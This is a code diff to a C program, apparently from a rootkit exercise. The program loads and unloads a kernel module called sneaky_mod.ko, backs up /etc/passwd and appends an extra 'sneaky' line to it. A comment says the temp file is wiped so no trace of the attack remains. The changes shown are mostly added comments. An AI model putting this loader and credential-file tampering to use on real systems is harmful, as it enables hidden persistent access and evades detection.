@@ -11,8 +11,13 @@ char * etc = "/etc/passwd";
 char * temp = "/tmp/passwd";
 pid_t pid;
 
+
+
+//Unloads the sneaky_mod.ko module
+
 void unload_module(){
 
+  //fork to create a new process
   pid_t unload_pid = fork();
   if(unload_pid < 0){
     perror("fork error for unloading module process");
@@ -23,10 +28,10 @@ void unload_module(){
      char * argv[3] = {"rmmod","sneaky_mod.ko", NULL};
      int value = execvp("rmmod", argv);
      if(value == -1){
-      perror( "execution error the module un-loading process");
+      perror( "execution error for the module un-loading process");
       exit(EXIT_FAILURE);
     }
-     printf("Removing module\n");
+     // printf("Removing module\n");
   }
 
   else {
@@ -40,12 +45,13 @@ void unload_module(){
 	}
 
     } while (!WIFEXITED(wait_status) && !WIFSIGNALED(wait_status));
+    //printf("Removing module\n");
     
   }
 
 }
 
-
+//loads the sneaky_module.ko
 void load_module(){
 
   pid_t parent_process = pid;
@@ -68,7 +74,7 @@ void load_module(){
       perror( "execution error the module loading process");
       exit(EXIT_FAILURE);
     }
-    printf("Uploading module for exploit\n");
+    // printf("Uploading module for exploit\n");
 
   }
 
@@ -84,12 +90,14 @@ void load_module(){
 	}
 
     } while (!WIFEXITED(wait_status) && !WIFSIGNALED(wait_status));
-    
+
+    //printf("Uploading module for exploit\n");
   }
 
 }
 
 
+//Initiate the copy file process
 void copy_file(char * src,  char * destination){
 
 
@@ -125,6 +133,8 @@ void copy_file(char * src,  char * destination){
 }
 
 
+//Add the extra line to /etc/passwd
+
 void add_sneaky_line (char * filename){
 
     FILE * file;
@@ -138,6 +148,8 @@ void add_sneaky_line (char * filename){
    }
 }
 
+
+//loop till 'q' is pressed
 
 void loop(){
 
@@ -176,5 +188,6 @@ int main(){
 
   //Delete the content of tmp file, no trace remains of sneaky attack
   fopen(temp, "w");
+  
   
 }
